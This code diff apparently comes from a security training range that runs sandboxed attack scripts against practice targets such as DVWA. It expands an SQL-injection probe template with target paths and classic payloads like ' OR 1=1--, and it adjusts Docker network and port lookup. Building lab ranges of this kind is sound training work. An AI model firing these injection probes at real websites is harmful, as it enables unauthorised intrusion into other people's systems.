@@ -80,25 +80,44 @@ print(json.dumps(info, ensure_ascii=False, indent=2))
 """,
 
     'SQL注入': """\
-import urllib.request as ur, urllib.parse, json
+import urllib.request as ur, urllib.parse, json, http.cookiejar
 target = '__TARGET__'
 port = __PORT__
-base = f'http://{target}:{port}/'
+base = f'http://{target}:{port}'
+# 常见 SQL 注入探测路径（覆盖 DVWA / 通用 Web 应用 / WebGoat 等靶场）
+probe_paths = [
+    '/vulnerabilities/sqli/',          # DVWA
+    '/search',                         # 通用
+    '/index.php',                      # 通用 PHP
+    '/',                               # 兜底根路径
+]
 payloads = [
     ("' OR '1'='1", 'OR 型注入'),
     ("' OR 1=1--",  '注释型注入'),
     ("1 AND SLEEP(0)--", '布尔盲注探测'),
 ]
+# 使用 CookieJar 自动处理 302 重定向（urllib 默认跟随重定向，但不带 Cookie，
+# 对 DVWA 等需要登录的靶场会落在 login 页面 —— 这是正常现象，仍然记录响应状态）
 results = []
-for payload, label in payloads:
-    url = base + '?id=' + urllib.parse.quote(payload)
-    try:
-        with ur.urlopen(url, timeout=4) as r:
-            body = r.read(512).decode(errors='ignore').lower()
-            sql_hint = any(k in body for k in ['sql','syntax','mysql','error','warning','exception'])
-            results.append({'label': label, 'payload': payload, 'status': r.status, 'sql_error_hint': sql_hint})
-    except Exception as e:
-        results.append({'label': label, 'payload': payload, 'error': str(e)[:60]})
+for path in probe_paths:
+    for payload, label in payloads:
+        url = base + path + '?id=' + urllib.parse.quote(payload)
+        try:
+            req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            with ur.urlopen(req, timeout=4) as r:
+                body = r.read(512).decode(errors='ignore').lower()
+                sql_hint = any(k in body for k in ['sql','syntax','mysql','error','warning','exception'])
+                results.append({'path': path, 'label': label, 'payload': payload,
+                                'status': r.status, 'sql_error_hint': sql_hint})
+                break  # 该路径成功响应，跳过剩余同路径 payload
+        except ur.error.HTTPError as e:
+            results.append({'path': path, 'label': label, 'payload': payload,
+                            'status': e.code, 'sql_error_hint': False})
+            break
+        except Exception as e:
+            results.append({'path': path, 'label': label, 'payload': payload,
+                            'error': str(e)[:80]})
+            break  # 路径不通，试下一条
 print(json.dumps({'attack': 'SQL注入', 'target': base, 'results': results}, ensure_ascii=False, indent=2))
 """,
 
@@ -324,7 +343,7 @@ def run_sandbox_attack(attack_type: str, target_host: str, target_port: int,
             return {'success': False, 'output': f'沙箱执行超时（>{SANDBOX_TIMEOUT}s）', 'real': False}
 
         raw = container.logs(stdout=True, stderr=True).decode('utf-8', errors='replace').strip()
-        container.remove()
+        container.remove(force=True)
 
         # 尝试美化 JSON 输出
         try:
@@ -346,29 +365,69 @@ def run_sandbox_attack(attack_type: str, target_host: str, target_port: int,
         return {'success': False, 'output': str(e), 'real': False}
 
 
-def get_target_network_and_ip(container_port: int) -> Tuple[Optional[str], Optional[str]]:
+def get_target_network_and_ip(container_port: int) -> Tuple[Optional[str], Optional[str], Optional[int]]:
     """
-    通过端口查找目标容器的 Docker 内网 IP 和所在网络名。
-    返回 (ip, network_name)，找不到时返回 (None, None)。
+    通过端口查找目标容器的 Docker 内网 IP、所在网络名和容器内部端口。
+    返回 (ip, network_name, internal_port)，找不到时返回 (None, None, None)。
+
+    重要：即使入参是主机端口（如 8080），返回的 internal_port 也是容器内部端口（如 80），
+    因为沙箱脚本在 Docker 内网中通信，必须使用容器内部端口。
     """
     client = _get_docker_client()
     if not client:
-        return None, None
+        return None, None, None
     try:
         from services.docker_isolate import _find_container_name_by_port
         cname = _find_container_name_by_port(container_port)
         if not cname:
-            return None, None
+            return None, None, None
         container = client.containers.get(cname)
         container.reload()
+
+        # 获取容器的内部端口（从 Docker inspect 或 targets 配置）
+        internal_port = None
+        # 方法1：从 Docker 暴露端口获取
+        exposed_ports = container.attrs.get('Config', {}).get('ExposedPorts', {})
+        if exposed_ports:
+            for port_key in exposed_ports:
+                try:
+                    internal_port = int(port_key.split('/')[0])
+                    break
+                except (ValueError, IndexError):
+                    pass
+        # 方法2：从 targets 表配置获取（更可靠）
+        if internal_port is None:
+            try:
+                from pathlib import Path
+                import sqlite3, json
+                db_path = Path(__file__).parent.parent / 'data' / 'ai_security_range.db'
+                conn = sqlite3.connect(str(db_path))
+                conn.row_factory = sqlite3.Row
+                cur = conn.cursor()
+                cur.execute("SELECT config FROM targets WHERE status = 'running'")
+                for row in cur.fetchall():
+                    try:
+                        cfg = json.loads(row['config'] or '{}')
+                        if cfg.get('container_name') == cname or cfg.get('container_port') == container_port or cfg.get('host_port') == container_port:
+                            internal_port = cfg.get('container_port')
+                            break
+                    except (json.JSONDecodeError, TypeError):
+                        pass
+                conn.close()
+            except Exception:
+                pass
+        # 兜底：用入参
+        if internal_port is None:
+            internal_port = container_port
+
         for net_name, net_info in container.attrs['NetworkSettings']['Networks'].items():
             if net_name not in ('host', 'none'):
                 ip = net_info.get('IPAddress', '')
                 if ip:
-                    return ip, net_name
+                    return ip, net_name, internal_port
     except Exception as e:
         logger.warning(f"[SandboxExecutor] 获取容器网络失败: {e}")
-    return None, None
+    return None, None, None
 
 
 # ---------------------------------------------------------------------------
